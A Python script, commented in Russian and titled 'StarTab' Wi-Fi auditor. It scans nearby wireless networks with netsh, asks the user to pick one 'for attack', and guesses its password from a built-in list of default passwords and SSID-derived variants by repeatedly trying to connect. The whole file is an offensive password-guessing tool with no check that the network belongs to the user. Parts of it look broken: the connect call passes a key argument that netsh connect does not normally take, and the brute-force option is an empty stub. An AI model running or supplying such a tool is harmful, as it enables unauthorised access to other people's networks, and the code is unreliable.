import subprocess
import re
import sys
import os

def scan_windows():
    result = subprocess.run(["netsh", "wlan", "show", "networks", "mode=Bssid"], capture_output=True, text=True, encoding="cp866")
    return result.stdout

def parse_networks(data):
    networks = []
    lines = data.split('\n')
    current = {}
    
    for line in lines:
        line = line.strip()
        
        m_ssid = re.match(r'^SSID\s+\d+\s*:\s*(.+)$', line)
        if m_ssid:
            if current:
                networks.append(current)
            current = {'ssid': m_ssid.group(1).strip(), 'bssid': '', 'signal': '', 'auth': '', 'channel': ''}
        
        m_bssid = re.match(r'^BSSID\s+\d+\s*:\s*([\w:]+)', line)
        if m_bssid and current:
            current['bssid'] = m_bssid.group(1).strip()
        
        m_signal = re.match(r'^Сигнал\s*:\s*(\d+)%', line)
        if not m_signal:
            m_signal = re.match(r'^Signal\s*:\s*(\d+)%', line)
        if m_signal and current:
            current['signal'] = m_signal.group(1)
        
        m_auth = re.match(r'^Проверка подлинности\s*:\s*(.+)$', line)
        if not m_auth:
           m_auth = re.match(r'^Authentication\s*:\s*(.+)$', line)

        if m_auth and current:
            current['auth'] = m_auth.group(1).strip()
        
        m_ch = re.match(r'^Канал\s*:\s*(\d+)', line)
        if not m_ch:
            m_ch = re.match(r'^Channel\s*:\s*(\d+)', line)
        if m_ch and current:
            current['channel'] = m_ch.group(1)
    
    if current:
        networks.append(current)
    
    return networks

# Default пароли
DEFAULT_PASSWORDS = [
    "12345678", "88888888", "888888eu", "11111111", "1234567890",
    "password", "admin", "1234", "00000000", "11223344",
    "87654321", "123456789", "qwertyui", "asdfghjk", "zxcvbnm",
    "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999", "0000",
    "1234", "4321", "abcd1234", "admin123", "root", "changeme",
    "default", "guest", "user", "pass", "pass1234", "P@ssw0rd",
    "wifi", "wlan", "network", "internet", "wireless",
    "0987654321", "0123456789", "98765432", "abcd", "dcba"
]

def masks_for_ssid(ssid):
    """Генерация масок на основе SSID"""
    masks = set()
    
    if len(ssid) >= 8 and ssid.isdigit():
        # Если SSID состоит из цифр — пробуем варианты сдвига
        masks.add(ssid)
        # Сдвиг на +1/-1 каждой цифры
        new_ssid = ''.join(str((int(c) + 1) % 10) for c in ssid if c.isdigit())
        masks.add(new_ssid)
        new_ssid2 = ''.join(str((int(c) - 1) % 10) for c in ssid if c.isdigit())
        masks.add(new_ssid2)
    
    # Укороченные версии
    if len(ssid) >= 8:
        for i in range(1, min(5, len(ssid))):
            if len(ssid) - i >= 8:
                masks.add(ssid[:-i])
    
    # Повторяющиеся шаблоны
    for i in range(4, min(8, len(ssid))):
        pattern = ssid[:i]
        if pattern * (8 // i) + pattern[:8 % i]:
            masks.add(pattern * (8 // i) + pattern[:8 % i])
    
    return [m for m in masks if len(m) == 8 and m]

def try_passwords(ssid, password_list):
    print(f"\n{'='*50}")
    print(f"[*] Подбор паролей для: {ssid}")
    
    # На Windows просто проверяем руками — netsh wlan connect
    for pwd in password_list:
        # Подключаемся по очереди
        result = subprocess.run(
            ["netsh", "wlan", "connect", f"name={ssid}", f"keyMaterial={pwd}"],
            capture_output=True, text=True, encoding="cp866",
            timeout=5
        )
        if "подключен" in result.stdout.lower() or "successfully" in result.stdout.lower():
            print(f"[+] ПАРОЛЬ НАЙДЕН: {pwd}")
            return pwd
    
    print("[-] Пароль не найден в списке")
    return None

def main():
    print(r"""
   _____ _         _____            _   
  / ____| |       |_   _|          | |  
 | (___ | |_ __ _   | |  __ _ _ __ | |_ 
  \___ \| __/ _` |  | | / _` | '_ \| __|
  ____) | || (_| | _| || (_| | |_) | |_ 
 |_____/ \__\__,_| \______\__,_| .__/ \__|
                                | |        
                                |_|        
    """)
    print("[*] StarTab — Windows Wi-Fi Auditor")
    
    print("\n[*] Сканирование сетей...")
    raw_data = scan_windows()
    networks = parse_networks(raw_data)
    
    if not networks:
        print("[!] Сетей не найдено. Запусти от имени администратора.")
        return
    
    print(f"\n[+] Найдено сетей: {len(networks)}")
    print("-" * 80)
    print(f"{'#':<4} {'SSID':<30} {'BSSID':<18} {'Сигнал':<7} {'Канал':<6} {'Тип':<12}")
    print("-" * 80)
    
    interesting_count = 0
    for i, net in enumerate(networks, 1):
        ssid = net['ssid']
        marker = "*" if ssid.startswith(('W', 'w', 'CD', 'cd', 'WD', 'wd')) else ""
        if marker:
            interesting_count += 1
        print(f"{i:<4} {ssid[:30]:<30} {net['bssid']:<18} {net['signal']:<7} {net['channel']:<6} {net['auth']:<12}{marker}")
    
    print("\n[*] Выбери номер сети для атаки (0 — выход):")
    try:
        choice = int(input("> "))
    except:
        print("[!] Выход")
        return
    
    if choice == 0:
        return
    
    if choice < 1 or choice > len(networks):
        print("[!] Неверный номер")
        return
    
    target = networks[choice - 1]
    ssid = target['ssid']
    
    print(f"\n[*] Цель: {ssid} ({target['bssid']})")
    print("[*] Методы подбора:")
    print("1 — Только дефолтные пароли")
    print("2 — Дефолтные + маски на основе SSID")
    print("3 — Дефолтные + маски + короткий брутфорс (8 цифр)")
    
    method = input("Выбери метод (1-3): ").strip()
    
    passwords = set()
    
    # Default
    passwords.update(DEFAULT_PASSWORDS)
    
    if method in ['2', '3']:
        passwords.update(masks_for_ssid(ssid))
    
    if method == '3':
        # короткий брутфорс: sample — от 00000000 до 99999999 слишком долго
        # для демонстрации — только популярные комбинации цифр
        pass
    
    passwords = [p.strip() for p in passwords if len(p.strip()) >= 4]
    
    print(f"[*] Попыток: {len(passwords)}")
    try_passwords(ssid, list(passwords))

if __name__ == "__main__":
    main()